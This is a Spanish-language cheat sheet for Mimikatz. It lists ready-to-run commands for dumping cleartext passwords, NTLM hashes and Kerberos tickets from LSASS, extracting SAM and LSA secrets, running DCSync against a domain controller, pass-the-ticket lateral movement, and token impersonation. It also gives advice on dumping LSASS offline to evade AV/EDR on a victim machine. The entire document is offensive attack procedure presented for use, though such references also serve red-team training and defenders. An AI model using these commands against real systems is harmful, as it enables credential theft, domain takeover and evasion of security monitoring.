# Mimikatz Cheat Sheet
> **Guía de referencia rápida para Mimikatz, la herramienta definitiva para extraer credenciales en texto claro, hashes NTLM, PINs y tickets Kerberos de la memoria RAM (proceso LSASS).**

---

## 🚀 Inicio y Preparación Inicial

Mimikatz requiere ejecutarse con privilegios de Administrador o SYSTEM.

* **Ejecutar Mimikatz e iniciar modo interactivo**:
  ```cmd
  mimikatz.exe
  ```
* **Habilitar privilegio de depuración (Obligatorio para interactuar con LSASS)**:
  ```cmd
  mimikatz # privilege::debug
  ```
* **Comprobar el usuario de ejecución actual en Mimikatz**:
  ```cmd
  mimikatz # coffee
  ```

---

## 🔑 Extracción de Credenciales en Memoria (LSASS)

* **Volcar todas las contraseñas en memoria (texto claro, hashes NTLM, Kerberos)**:
  ```cmd
  mimikatz # sekurlsa::logonpasswords
  ```
* **Extraer credenciales específicas**:
  * **Hashes NTLM y LM**: `mimikatz # sekurlsa::msv`
  * **Contraseñas WDigest (Texto claro en Windows antiguos o habilitadas por registro)**: `mimikatz # sekurlsa::wdigest`
  * **Claves Kerberos y contraseñas**: `mimikatz # sekurlsa::kerberos`
  * **Credenciales de proveedores de SSP**: `mimikatz # sekurlsa::ssp`

---

## 🗄️ Extracción de Secretos Locales y del Dominio (SAM y LSA)

* **Volcar la base de datos SAM local (hashes de administradores locales)**:
  ```cmd
  mimikatz # lsadump::sam
  ```
* **Volcar secretos de la LSA (contraseñas de servicios en la máquina)**:
  ```cmd
  mimikatz # lsadump::secrets
  ```
* **Ataque DCSync remoto (volcar hash de un usuario de dominio desde el controlador)**:
  ```cmd
  mimikatz # lsadump::dcsync /user:Administrador /domain:dominio.local
  ```

---

## 🎫 Gestión de Tickets Kerberos y Movimiento Lateral

* **Listar los tickets Kerberos guardados en memoria**:
  ```cmd
  mimikatz # kerberos::list
  # O bien usando sekurlsa (extrae de todos los usuarios):
  mimikatz # sekurlsa::tickets
  ```
* **Exportar todos los tickets Kerberos en memoria a disco (archivos `.kirbi`)**:
  ```cmd
  mimikatz # sekurlsa::tickets /export
  ```
* **Ataque Pass-the-Ticket (PTT - Cargar un ticket `.kirbi` en la sesión actual)**:
  ```cmd
  mimikatz # kerberos::ptt C:\Temp\ticket_administrador.kirbi
  ```

---

## 🪪 Gestión de Tokens e Impersonación

Útil para asumir la identidad de un usuario con sesión abierta en la máquina.

* **Listar tokens de seguridad activos**:
  ```cmd
  mimikatz # token::list
  ```
* **Elevar privilegios al token de Administrador o SYSTEM**:
  ```cmd
  mimikatz # token::elevate
  # Para volver al usuario original:
  mimikatz # token::revert
  ```
* **Impersonar el token de un usuario específico**:
  ```cmd
  mimikatz # token::elevate /user:Administrador
  ```

---

## 🧠 Análisis Offline de Minidumps de LSASS

Si ejecutas Mimikatz localmente en la máquina víctima y hay sospechas de detección (AV/EDR), puedes realizar un volcado de LSASS usando `Procdump` o `Task Manager` y leerlo en tu propia máquina atacante (Windows).

1. **Cargar el archivo minidump en Mimikatz**:
   ```cmd
   mimikatz # sekurlsa::minidump lsass.dmp
   ```
2. **Ejecutar comandos habituales (ahora se ejecutan sobre el archivo offline)**:
   ```cmd
   mimikatz # sekurlsa::logonpasswords
   ```
